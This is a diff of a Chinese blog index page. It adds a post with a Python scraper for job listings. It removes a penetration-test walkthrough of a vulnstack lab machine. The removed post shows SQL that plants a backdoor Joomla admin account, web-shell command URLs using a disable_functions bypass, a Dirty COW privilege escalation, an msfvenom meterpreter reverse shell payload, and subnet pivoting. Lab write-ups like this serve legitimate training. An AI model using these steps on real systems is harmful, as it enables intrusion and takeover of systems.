@@ -235,6 +235,61 @@
 
 
   
+    <article id="post-note/data/webcrawler" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/02/05/note/data/webcrawler/" class="article-date">
+  	<time datetime="2021-02-05T04:05:59.000Z" itemprop="datePublished">2021-02-05</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/05/note/data/webcrawler/">
+        网络爬虫入门
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>主要使用requests和BeautifulSoup库，BeautifulSoup使用CSS过滤器</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="comment"># from bs4.element import Tag</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOk</span>(<span class="params">base</span>):</span></span><br><span class="line">    print(base)</span><br><span class="line">    res = []</span><br><span class="line">    response = requests.get(base)</span><br><span class="line">    soup = BeautifulSoup(response.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> soup.select(<span class="string">&#x27;.zg_spbt&#x27;</span>):</span><br><span class="line">        c = i.children</span><br><span class="line">        next(c)</span><br><span class="line">        aTag = next(c)</span><br><span class="line">        href = aTag.get(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">        title = aTag.get_text()</span><br><span class="line">        <span class="comment"># print(href,title)</span></span><br><span class="line">        response1 = requests.get(href)</span><br><span class="line">        response1.encoding=<span class="string">&#x27;gbk&#x27;</span></span><br><span class="line">        soup = BeautifulSoup(response1.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">        title = title.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="number">-1</span>)</span><br><span class="line">        title = title.replace(<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="number">-1</span>)</span><br><span class="line">        scrText = soup.select(<span class="string">&#x27;.zg_list_zi&#x27;</span>)[<span class="number">0</span>].get_text()</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;人力&#x27;</span> <span class="keyword">in</span> scrText <span class="keyword">or</span> <span class="string">&#x27;人事&#x27;</span> <span class="keyword">in</span> scrText) <span class="keyword">and</span> (<span class="string">&#x27;本科&#x27;</span> <span class="keyword">in</span> scrText <span class="keyword">or</span> (<span class="string">&#x27;硕士&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> scrText <span class="keyword">and</span> <span class="string">&#x27;研究生&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> scrText)):</span><br><span class="line">            print(href,title)</span><br><span class="line">            res.append(&#123;</span><br><span class="line">                <span class="string">&#x27;链接&#x27;</span>:href,</span><br><span class="line">                <span class="string">&#x27;title&#x27;</span>:title,</span><br><span class="line">                <span class="string">&#x27;文章过短需要二次查看&#x27;</span>:<span class="literal">False</span>,</span><br><span class="line">                <span class="string">&#x27;文章长度&#x27;</span>:len(scrText)</span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="keyword">elif</span> len(scrText)&lt;<span class="number">1000</span> <span class="keyword">and</span> <span class="string">&#x27;研究生&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> scrText <span class="keyword">and</span> <span class="string">&#x27;硕士&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> scrText: <span class="comment"># 有的文章只配了图片</span></span><br><span class="line">            print(href,title)</span><br><span class="line">            res.append(&#123;</span><br><span class="line">                <span class="string">&#x27;链接&#x27;</span>:href,</span><br><span class="line">                <span class="string">&#x27;title&#x27;</span>:title,</span><br><span class="line">                <span class="string">&#x27;文章过短需要二次查看&#x27;</span>:<span class="literal">True</span>,</span><br><span class="line">                <span class="string">&#x27;文章长度&#x27;</span>:len(scrText)</span><br><span class="line">            &#125;)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    preUrl = <span class="string">&#x27;http://www.zggqzp.com/zpxx/&#x27;</span></span><br><span class="line">    pagesUrl = [<span class="string">&#x27;60_60_2_0.html&#x27;</span>]</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">9</span>): <span class="comment"># 2020,2021招聘信息只有前8页有</span></span><br><span class="line">        pagesUrl.append(<span class="string">&#x27;60_60_2_%d.html&#x27;</span>%i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pagesUrl:</span><br><span class="line">        res+=getOk(preUrl+i)</span><br><span class="line">    print(res)</span><br><span class="line">    <span class="comment"># print(minLen,minHref)</span></span><br><span class="line">    df = pd.DataFrame(res)</span><br><span class="line">    df.to_excel(<span class="string">&#x27;work.xlsx&#x27;</span>,columns=[<span class="string">&#x27;链接&#x27;</span>,<span class="string">&#x27;title&#x27;</span>,<span class="string">&#x27;文章过短需要二次查看&#x27;</span>,<span class="string">&#x27;文章长度&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line">    print(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line"><span class="comment"># for i in soup.select(&#x27;.zg_spsj&#x27;):</span></span><br><span class="line"><span class="comment">#     print(i)</span></span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-note/papers/emotion-analysis-1" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -815,80 +870,6 @@
 <li><p>IDA插件</p>
 </li>
 </ol>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-note/web/pentist-3" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/01/01/note/web/pentist-3/" class="article-date">
-  	<time datetime="2021-01-01T08:32:17.000Z" itemprop="datePublished">2021-01-01</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/01/note/web/pentist-3/">
-        靶机看答案渗透记录-3
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>靶机下载地址 <a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/5/">http://vulnstack.qiyuanxuetang.net/vuln/detail/5/</a></p>
-<p>wp参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/wkzb/p/13281772.html">https://www.cnblogs.com/wkzb/p/13281772.html</a></p>
-<p>我的机器上如果所有虚拟机都按照原定内存的话内存不够，所以为了缩减内存，只能先看最后找密码了5555</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">win7 123qwe!ASD</span><br><span class="line">08 123qwe!ASD</span><br><span class="line">win10 zxcASDqw123!!</span><br></pre></td></tr></table></figure>
-
-<p>要开启nginx服务，直接执行nginx命令即可(原本是开着的，可是改内存需要关机)</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`am2zu_users`</span></span><br><span class="line">   (<span class="string">`name`</span>, <span class="string">`username`</span>, <span class="string">`password`</span>, <span class="string">`params`</span>, <span class="string">`registerDate`</span>, <span class="string">`lastvisitDate`</span>, <span class="string">`lastResetTime`</span>)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">&#x27;Administrator2&#x27;</span>, <span class="string">&#x27;admin2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="keyword">NOW</span>(), <span class="keyword">NOW</span>(), <span class="keyword">NOW</span>());</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`am2zu_user_usergroup_map`</span> (<span class="string">`user_id`</span>,<span class="string">`group_id`</span>)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="keyword">LAST_INSERT_ID</span>(),<span class="string">&#x27;8&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
-<p><a target="_blank" rel="noopener" href="http://172.16.45.136/templates/beez3/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/baji&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so">http://172.16.45.136/templates/beez3/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/baji&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so</a></p>
-<p><a target="_blank" rel="noopener" href="http://172.16.45.136/templates/beez3/bypass_disablefunc.php?cmd=ifconfig&amp;outpath=/tmp/baji&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so">http://172.16.45.136/templates/beez3/bypass_disablefunc.php?cmd=ifconfig&amp;outpath=/tmp/baji&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so</a></p>
-<p><a target="_blank" rel="noopener" href="http://172.16.45.136/templates/beez3/bypass_disablefunc.php?cmd=cat%20/proc/version&amp;outpath=/tmp/baji&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so">http://172.16.45.136/templates/beez3/bypass_disablefunc.php?cmd=cat%20/proc/version&amp;outpath=/tmp/baji&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so</a></p>
-<p>gcc -pthread dirty.c -o dirty -lcrypt</p>
-<p>su firefart/baji</p>
-<p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=4444 -f elf &gt; shell.elf</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfconsole&gt;set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msfconsole&gt;set lhost 172.16.45.129</span><br><span class="line">msfconsole&gt;set lport 4444</span><br></pre></td></tr></table></figure>
-
-<p>run autoroute -s 192.168.93.0/24<br>background<br>use auxiliary/scanner/smb/smb_version<br>set rhosts 192.168.93.0/24<br>exploit</p>
-<p>192.168.93.10 2012<br>192.168.93.20 2008<br>192.168.93.30 7</p>
-<p>爆破2008密码这块出问题了，总是readtimeout，先参考其它大师傅的结果吧，Windows 2008密码为123qwe!ASD</p>
 
       
     </div>
